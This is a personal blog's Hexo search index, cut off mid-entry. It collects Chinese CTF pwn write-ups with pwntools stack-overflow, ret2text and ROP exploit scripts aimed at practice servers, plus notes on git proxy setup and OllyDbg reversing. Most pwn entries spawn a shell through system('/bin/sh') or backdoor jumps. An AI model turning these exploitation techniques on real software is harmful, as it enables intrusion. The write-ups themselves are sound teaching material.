<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>hexo部署博客到git失败</title>
      <link href="/others/a54492701d19/"/>
      <url>/others/a54492701d19/</url>
      
        <content type="html"><![CDATA[<p>写完了博客想要部署到git上面去，发现总是提示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fatal: unable to access &#x27;https://github.com/xxx/xxxx.github.io/&#x27;: Failed to connect to github.com port 443 after 5125 ms: Couldn&#x27;t connect to server</span><br></pre></td></tr></table></figure><p>之前解决过但是总是忘，这里记一下，是因为代理没有配置到git的config中导致的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global http.proxy 127.0.0.1:10809</span><br><span class="line">git config --global https.proxy 127.0.0.1:10809</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> others </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BJDCTF 2020 babystack2.0</title>
      <link href="/pwn/8ad46297829f/"/>
      <url>/pwn/8ad46297829f/</url>
      
        <content type="html"><![CDATA[<h1 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h1><p><img src="https://raw.githubusercontent.com/fc8/Picrepository/master/202309191035097.png" alt="image.png"><br>在程序中，限制了nbytes的长度，所以这里需要用到整数溢出</p><blockquote><p>《CTF竞赛权威指南》中，将整数的异常情况分为三种：溢出，回绕和截断。有符号整数发生的是溢出，对应字节数的有符号整数，最大值+1，会成为最小值，最小值-1会成为最大值，此种情况可能绕过&gt;0或&lt; 0的检测；无符号整数发生的是回绕，最大值+1变为0，最小值-1变为最大值；截断则出现在将运算结果赋值给不恰当大小的整数数据类型和不当的类型转换的情况下。</p></blockquote><p>如果在<code>nbytes</code>里面输入-1，则经过<code>(unsigned int)</code>类型转换后会变成很大的整数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&quot;node4.anna.nssctf.cn&quot;</span>,<span class="number">28774</span>)</span><br><span class="line">backdoor = <span class="number">0x0000000000400726</span></span><br><span class="line">payload = <span class="string">b&#x27;0&#x27;</span> * <span class="number">0x18</span> + p64(backdoor)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;name:&#x27;</span>,<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;name?&#x27;</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li><a href="https://xz.aliyun.com/t/11047">https://xz.aliyun.com/t/11047</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> 栈溢出 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CISCN 2019华北 PWN1</title>
      <link href="/pwn/05fe4766eea9/"/>
      <url>/pwn/05fe4766eea9/</url>
      
        <content type="html"><![CDATA[<h1 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h1><p><img src="https://raw.githubusercontent.com/fc8/Picrepository/master/202309190936531.png" alt="image.png"></p><p>main函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  func();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查看func函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">func</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1[<span class="number">44</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">float</span> v2; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">0.0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Let&#x27;s guess the number.&quot;</span>);</span><br><span class="line">  gets(v1);</span><br><span class="line">  <span class="keyword">if</span> ( v2 == <span class="number">11.28125</span> )</span><br><span class="line">    <span class="keyword">return</span> system(<span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Its value should be 11.28125&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果v2的值是11.28125的话，那么就得到了flag，所以就要向v2中写入数据。<br>具体的思路是，先把v1填满，然后向下溢出写入数字到v2的地址中。这里不能直接写11.28125，要转成IEEE754格式的十六进制。<br><img src="https://raw.githubusercontent.com/fc8/Picrepository/master/202309190947304.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/fc8/Picrepository/master/202309190944261.png" alt="image.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&quot;node4.anna.nssctf.cn&quot;</span>,<span class="number">28612</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x2C</span> + p64(<span class="number">0x41348000</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;number.&#x27;</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li><a href="https://www.toolhelper.cn/Digit/FractionConvert">https://www.toolhelper.cn/Digit/FractionConvert</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> 栈迁移 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NISACTF 2022 ReorPwn</title>
      <link href="/pwn/e464a46871e1/"/>
      <url>/pwn/e464a46871e1/</url>
      
        <content type="html"><![CDATA[<h1 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h1><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li>url</li></ul>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LitCTF 2023 只需要nc一下</title>
      <link href="/pwn/d8db0fb5d872/"/>
      <url>/pwn/d8db0fb5d872/</url>
      
        <content type="html"><![CDATA[<h1 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h1><p><code>env</code>指令和<code>echo $FLAG</code>都可以查看FLAG。</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li><a href="https://www.nssctf.cn/note/set/2175">https://www.nssctf.cn/note/set/2175</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NISACTF 2022 ezstack</title>
      <link href="/pwn/a40327cb7ae9/"/>
      <url>/pwn/a40327cb7ae9/</url>
      
        <content type="html"><![CDATA[<h1 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h1><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li>url</li></ul>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SWPUCTF 2021 新生赛 gift_pwn</title>
      <link href="/pwn/af4b3c760574/"/>
      <url>/pwn/af4b3c760574/</url>
      
        <content type="html"><![CDATA[<h1 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h1><h2 id="一些基础知识"><a href="#一些基础知识" class="headerlink" title="一些基础知识"></a>一些基础知识</h2><p><img src="https://raw.githubusercontent.com/fc8/Picrepository/master/202309182115394.png" alt="image.png"></p><ul><li>Arch: 程序架构信息，判断是64位还是32位</li><li>RELRO: 此技术主要针对GOT改写的攻击方式，它分为两种，Partial RELRO 和 Full RELRO<ul><li>Partial RELRO易受到攻击</li><li>Full RELRO使整个GOT只读，从而无法被覆盖，但这样会大大增加程序的启动时间，因为程序在启动之前需要解析所有的符号</li></ul></li><li>Stack-canary: 栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够执行。当启用栈保护后，函数开始执行的时候会先往栈里插入类似cookie的信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode执行，在Linux中我们将cookie信息称为canary。</li><li>NX: NX开启意味着栈中数据没有执行权限，当攻击者在堆栈上部署自己的shellcode并处罚时，只会造成程序崩溃，可以利用rop方法绕过。</li><li>PIE: 在编译时将程序编译为位置无关，即程序运行时各个段加载的虚拟地址也是在装载时才确定。</li></ul><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>经过checksec分析，该程序是一个64位的程序，并且没有开启栈保护。<br>然后放到ida64中进行分析。<br><img src="https://raw.githubusercontent.com/fc8/Picrepository/master/202309182116259.png" alt="image.png"><br>只有一个vuln()函数，进入函数查看具体实现<br><img src="https://raw.githubusercontent.com/fc8/Picrepository/master/202309190900558.png" alt="image.png"><br>因此，payload思路就是先填满buf的10h内容，然后覆盖调用函数的ebp，就可以写入指定的地址覆盖eip，达到控制程序流的目的。<br>查看gift的程序地址<br><img src="https://raw.githubusercontent.com/fc8/Picrepository/master/202309190910304.png" alt="image.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&quot;node5.anna.nssctf.cn&quot;</span>,<span class="number">28447</span>)</span><br><span class="line">git_addr = <span class="number">0x00000000004005B6</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>* <span class="number">0x10</span> + <span class="string">b&#x27;bbbbbbbb&#x27;</span> + p64(git_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li><a href="https://bbs.kanxue.com/thread-270947.htm">https://bbs.kanxue.com/thread-270947.htm</a></li><li><a href="https://bbs.kanxue.com/thread-271236.htm">https://bbs.kanxue.com/thread-271236.htm</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> 栈溢出 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BJDCTF 2020 babystack</title>
      <link href="/pwn/9193847b8b0e/"/>
      <url>/pwn/9193847b8b0e/</url>
      
        <content type="html"><![CDATA[<h1 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h1><p><img src="https://raw.githubusercontent.com/fc8/Picrepository/master/202309191004035.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/fc8/Picrepository/master/202309191004965.png" alt="image.png"><br>首先输入一个整数，代表下面要读的缓冲区的大小。read函数读取nbytes长度的输入到buf中，但是buf长度只有10h，所以如果我们输入的内容长度大于10h则会导致栈溢出，所以nbytes这里输入的长度要大于10h和payload的长度。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&quot;node4.anna.nssctf.cn&quot;</span>,<span class="number">28220</span>)</span><br><span class="line">backdoor = <span class="number">0x00000000004006E6</span></span><br><span class="line">payload = <span class="string">b&#x27;0&#x27;</span> * <span class="number">0x18</span> + p64(backdoor)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;name:&#x27;</span>,<span class="string">b&#x27;30&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;name?&#x27;</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li>url</li></ul>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> 栈溢出 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GFCTF 2021 where_is_shell</title>
      <link href="/pwn/f685e2e9198b/"/>
      <url>/pwn/f685e2e9198b/</url>
      
        <content type="html"><![CDATA[<h1 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h1><p>查看程序的保护<br><img src="https://raw.githubusercontent.com/fc8/Picrepository/master/202309280927646.png" alt="image.png"><br>放入IDA中进行分析，存在栈溢出。<br><img src="https://raw.githubusercontent.com/fc8/Picrepository/master/202309280925172.png" alt="image.png"><br>找到<code>system</code>函数<br><img src="https://raw.githubusercontent.com/fc8/Picrepository/master/202309280927809.png" alt="image.png"><br>但是没有在字符串中找到<code>/bin/sh</code><br>然后看到有tips，<br><img src="https://raw.githubusercontent.com/fc8/Picrepository/master/202309281151658.png"><br><img src="https://raw.githubusercontent.com/fc8/Picrepository/master/202309281152829.png" alt="image.png"><br>这里可以使用<code>system($0)</code>来获得shell权限。<br>首先用垃圾数据填充栈，进行栈溢出，然后将数据放入<code>$0</code>放入rdi中，然后跳到<code>system</code>函数执行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = process(<span class="string">&quot;./shell&quot;</span>)</span><br><span class="line"><span class="comment"># p = remote(&quot;node4.anna.nssctf.cn&quot;,28968)</span></span><br><span class="line"></span><br><span class="line">ret_rdi = <span class="number">0x00000000004005e3</span></span><br><span class="line">sys_addr = <span class="number">0x400430</span></span><br><span class="line">code_addr = <span class="number">0x400541</span></span><br><span class="line">ret_addr = <span class="number">0x0000000000400416</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;b&#x27;</span> * (<span class="number">0x10</span>+<span class="number">8</span>) + p64(ret_addr) + p64(ret_rdi) + p64(code_addr) + p64(sys_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li>url</li></ul>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NISACTF 2022 ezpie</title>
      <link href="/null/56a140697ded/"/>
      <url>/null/56a140697ded/</url>
      
        <content type="html"><![CDATA[<h1 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h1><p><img src="https://raw.githubusercontent.com/fc8/Picrepository/master/202309211537885.png" alt="image.png"><br>程序是32位，开启了PIE保护，就是每次程序加载的基址都是随机的。</p><blockquote><p>PIE: PIE全称是position-independent executable，中文解释为地址无关可执行文件，该技术是一个针对代码段（.text）、数据段（.data）、未初始化全局变量段（.bss）等固定地址的一个防护技术，如果程序开启了PIE保护的话，在每次加载程序时都变换加载地址，从而不能通过ROPgadget等一些工具来帮助解题。</p></blockquote><p>拖入IDA中看下，在函数<code>vuln()</code>中存在栈溢出，也给了后门函数<code>shell()</code>。并且给了main函数的地址，这样就简单多了，只需要计算<code>shell</code>函数和<code>main</code>函数的偏移，截图中即为<code>80F - 770</code>得到两个函数的偏移为<code>0x9F</code>。<br><img src="https://raw.githubusercontent.com/fc8/Picrepository/master/202309211541182.png" alt="image.png"><br>payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&quot;node5.anna.nssctf.cn&quot;</span>,<span class="number">28617</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;gift!\n0x&#x27;</span>)</span><br><span class="line">main_addr = <span class="built_in">int</span>(io.recv(<span class="number">8</span>).decode(),<span class="number">16</span>)</span><br><span class="line">shell_addr = main_addr + <span class="number">0x9F</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x28</span> + <span class="string">b&#x27;b&#x27;</span> * <span class="number">4</span> + p32(shell_addr)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Input:&#x27;</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li><a href="https://xz.aliyun.com/t/12809">https://xz.aliyun.com/t/12809</a></li><li></li></ul>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> 栈溢出 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>jarvisoj_level2_x64</title>
      <link href="/pwn/145c9ce4068b/"/>
      <url>/pwn/145c9ce4068b/</url>
      
        <content type="html"><![CDATA[<h1 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">28045</span>)</span><br><span class="line"><span class="comment"># io = process(&#x27;./level2_x64&#x27;)</span></span><br><span class="line"><span class="comment"># 0x9F</span></span><br><span class="line"><span class="comment"># io.recvline(&#x27;World\n&#x27;)</span></span><br><span class="line">ret_addr = <span class="number">0x00000000004004a1</span> <span class="comment">#栈帧平衡</span></span><br><span class="line">ret_rdi_addr = <span class="number">0x00000000004006b3</span></span><br><span class="line">bin_sh_addr = <span class="number">0x600A90</span></span><br><span class="line">system_addr = <span class="number">0x4004C0</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x80</span> +  <span class="string">b&#x27;b&#x27;</span> * <span class="number">8</span>  + p64(ret_addr) + p64(ret_rdi_addr) + p64(bin_sh_addr) + p64(system_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li>url</li></ul>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> 栈迁移 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn1_sctf_2016</title>
      <link href="/pwn/293ed8043ecd/"/>
      <url>/pwn/293ed8043ecd/</url>
      
        <content type="html"><![CDATA[<h1 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h1><p><img src="https://raw.githubusercontent.com/fc8/Picrepository/master/202310081608729.png" alt="image.png"></p><p>首先，在输入到<code>s</code>的内容中不存在栈溢出，只能输入32个字符。再往后看，发现有一个替换字符串的过程，会将<code>s</code>中的<code>I</code>替换为<code>you</code>，这样如果我们输入一个<code>I</code>，就会多出两个字符，这样的话，<code>s</code>距离ebp的长度是<code>3C-&gt;60</code>，所以我们需要输入20个<code>I</code>就可以填满<code>s</code>的栈空间，这样就会多出12个字符可以用来进行栈溢出，找到后门函数<code>get_flag</code>，替换ret_addr即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">27953</span>)</span><br><span class="line">ret_addr = <span class="number">0x8048F0D</span></span><br><span class="line">payload = <span class="string">b&#x27;I&#x27;</span> * (<span class="number">0x14</span>) + <span class="string">b&#x27;avss&#x27;</span> + p32(ret_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">a = io.recvall()</span><br><span class="line"><span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li><a href="https://blog.csdn.net/tqydyqt/article/details/104973193">https://blog.csdn.net/tqydyqt/article/details/104973193</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OD使用总结</title>
      <link href="/re/2717e75a9169/"/>
      <url>/re/2717e75a9169/</url>
      
        <content type="html"><![CDATA[<table><thead><tr><th>指令</th><th>快捷键</th><th>说明</th></tr></thead><tbody><tr><td>Step Into</td><td>F7</td><td>单步执行，进入</td></tr><tr><td>Step Over</td><td>F8</td><td>单步执行，跳过</td></tr><tr><td>Restart</td><td>Ctrl+F2</td><td>终止程序，重新载入</td></tr><tr><td>Go to</td><td>Ctrl+G</td><td>跳转到指定地址</td></tr><tr><td>Run</td><td>F9</td><td>运行，遇到断点停</td></tr><tr><td>Execute till return</td><td>Ctrl+F9</td><td>执行函数代码，直到遇到RETN命令，用于跳出函数体</td></tr><tr><td>Execute till cursor</td><td>F4</td><td>执行到光标所在位置</td></tr><tr><td>Comment</td><td>;</td><td>添加注释</td></tr><tr><td>Assemble</td><td>空格</td><td>编写汇编代码</td></tr><tr><td>Edit Data</td><td>Ctrl+E</td><td>编辑数据</td></tr><tr><td></td><td></td><td></td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> re </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逆向helloworld程序</title>
      <link href="/re/8618609a716c/"/>
      <url>/re/8618609a716c/</url>
      
        <content type="html"><![CDATA[<h1 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h1><p>找到main函数，修改弹窗内容</p><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>使用od加载Helloworld程序，窗口如下所示<br><img src="https://raw.githubusercontent.com/fc8/Picrepository/master/202303121954688.png" alt="image.png"></p><ul><li>代码窗口：默认用于显示反汇编代码，还用于显示各种注释、标签，分析代码时显示循环、跳转位置等信息</li><li>寄存器窗口：实时显示CPU寄存器的值，可用于修改特定的寄存器</li><li>数据窗口：以HEX&#x2F;ASCII&#x2F;Unicode值的形式显示进程的内存地址，也可在此修改内存地址</li><li>栈窗口：实时显示&#x3D;&#x3D;ESP（栈指针）&#x3D;&#x3D;寄存器指向的进程栈内存，并允许修改<br>在调试器停止的地方就是程序的起始地址，本程序中为4011A0，它是一段EP(EntryPoint)代码。<blockquote><p>在od中，红色注释为Win32Api函数</p></blockquote></li></ul><p>在4011A5处<em>JMP 0040104F</em>跳转到0040104F地址处，这里就是Visual C++的启动函数<br><img src="https://raw.githubusercontent.com/fc8/Picrepository/master/202303122007704.png" alt="image.png"></p><h2 id="查找Main函数的几种办法"><a href="#查找Main函数的几种办法" class="headerlink" title="查找Main函数的几种办法"></a>查找Main函数的几种办法</h2><h3 id="顺序查找"><a href="#顺序查找" class="headerlink" title="顺序查找"></a>顺序查找</h3><p>在main函数中有调用MessageBox()的api代码，所以可以顺序查找每一个call，如果在其中找到MessageBox()Api，就可以继续分析；如果没有，就可以直接跳过。<br>在地址00401144处有一条代码CALL 00401000，进入之后可以看到调用了MessageBox()，并且参数也一致，所以可以判断00401000函数就是我们要找的Main函数<br><img src="https://raw.githubusercontent.com/fc8/Picrepository/master/202303122012493.png" alt="image.png"></p><h3 id="代码执行法"><a href="#代码执行法" class="headerlink" title="代码执行法"></a>代码执行法</h3><p>我们需要查找的main函数中执行了MessageBox()函数，main函数执行后会弹出一个消息对话框。所以我们只需要一直F8执行，直到程序弹出对话框的时候，就表示执行了main函数，当前断点对应的的函数也就是main函数了。</p><h3 id="字符串检索"><a href="#字符串检索" class="headerlink" title="字符串检索"></a>字符串检索</h3><p>鼠标右键-中文搜索-Unicode可以找到MessageBox的参数，进行定位</p><h3 id="API检索"><a href="#API检索" class="headerlink" title="API检索"></a>API检索</h3><p>右键-查找-所有模块间调用<br>可以看到程序调用了user32.MessageBoxW，该函数位于0040100E处，双击进入找到main函数。<br><img src="https://raw.githubusercontent.com/fc8/Picrepository/master/202303122024122.png" alt="image.png"></p><h3 id="在api代码中设置断点"><a href="#在api代码中设置断点" class="headerlink" title="在api代码中设置断点"></a>在api代码中设置断点</h3><p>当程序使用了压缩器&#x2F;保护器等工具，od可能无法列出api调用列表，此时我们可以对dll代码库进行添加断点，在od中选择view-memory打开内存映射窗口，可以看到user32库被加载到了内存中。<br><img src="https://raw.githubusercontent.com/fc8/Picrepository/master/202303122028628.png" alt="image.png"><br>在od中右键-查找-所有模块中的名称可以列出被加载dll文件中提供的所有api，我们查找messagebox<br><img src="https://raw.githubusercontent.com/fc8/Picrepository/master/202303122034539.png" alt="image.png"><br>双击进入函数，对函数下断点，执行程序<br><img src="https://raw.githubusercontent.com/fc8/Picrepository/master/202303122036685.png" alt="image.png"><br>从栈中可以看到ESP 0019FF1C记录一个返回地址为00401014，main函数调用完MessageBoxW函数后，程序执行流将返回到该地址处。</p><h2 id="修改内容"><a href="#修改内容" class="headerlink" title="修改内容"></a>修改内容</h2><h3 id="第一种方式"><a href="#第一种方式" class="headerlink" title="第一种方式"></a>第一种方式</h3><p>找到main函数之后，可以看到弹窗字符串的存放位置为004092A0</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00401007 push HelloWor.004092A0     Hello World!</span><br></pre></td></tr></table></figure><p>在数据窗口跳转到004092A0<br><img src="https://raw.githubusercontent.com/fc8/Picrepository/master/202303211243354.png" alt="image.png"><br>双击打开编辑界面，即可以对内容进行修改。<br><img src="https://raw.githubusercontent.com/fc8/Picrepository/master/202303211246771.png" alt="image.png"></p><blockquote><p>若新字符串的长度大于原有的字符串，执行覆盖操作时可能损坏字符串后面的数据，所以一定要小心。</p></blockquote><p><img src="https://raw.githubusercontent.com/fc8/Picrepository/master/202303211249678.png" alt="image.png"></p><h3 id="第二种方式"><a href="#第二种方式" class="headerlink" title="第二种方式"></a>第二种方式</h3><p>在给MessageBoxW()函数传递字符串参数时，传递的是字符串所在区域的首地址，如果改变了字符串的地址，消息框就会显示变更后的字符串。所以在内存的某个区域新建一个长字符串，并把新字符串的首地址传递给MessageBoxW()函数。</p><blockquote><p>应用程序被加载到内存时有一个最小的内存分配大小，一般为1000。即使程序运行时只占用了100内存，它被加载到内存时仍然会分到1000左右的内存，这些内存一部分被程序占用，其余部分为空余区域，全部被填充为NULL。<br><img src="https://raw.githubusercontent.com/fc8/Picrepository/master/202303211254260.png" 